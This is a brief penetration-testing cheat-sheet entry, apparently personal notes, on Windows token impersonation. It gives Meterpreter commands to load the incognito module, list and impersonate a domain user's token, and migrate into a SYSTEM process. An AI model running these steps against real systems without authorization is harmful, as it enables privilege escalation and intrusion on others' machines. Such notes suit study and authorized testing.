# Token Impersonation:
- Can be done using the following commands whilst having a meterpreter session:
```bash
# In Metasploit Meterpreter:
use incognito
list_tokens -g
impersonate_token DOMAIN\\USER
# Since the token might give you admin, you won't be able to drop into a shell directly, for that, we need to migrate to SYSTEM Process.
migrate <PROCESS ID>
```